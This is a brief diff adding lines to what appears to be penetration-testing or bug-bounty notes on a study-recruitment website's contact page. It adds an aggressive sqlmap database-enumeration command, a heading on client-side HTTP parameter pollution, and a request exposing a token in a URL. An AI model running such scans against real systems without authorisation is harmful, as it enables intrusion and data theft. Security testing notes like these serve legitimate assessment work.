@@ -19,3 +19,20 @@ Connection: close
 Cache-Control: max-age=0
 ```
 
+```bash
+sqlmap -r request.txt --dbs --level 5 --risk 3 
+```
+
+## Client-side HTTP parameter pollution
+
+```
+POST /studies/rheumatoid-arthritis-galvani/contact/
+```
+
+### Session token in url 
+
+```
+GET /content/verily/us/en/studies/rheumatoid-arthritis-galvani/contact/jcr:content.recaptcha.json?token=03AFcWeA7zmp4
+...
+```
+
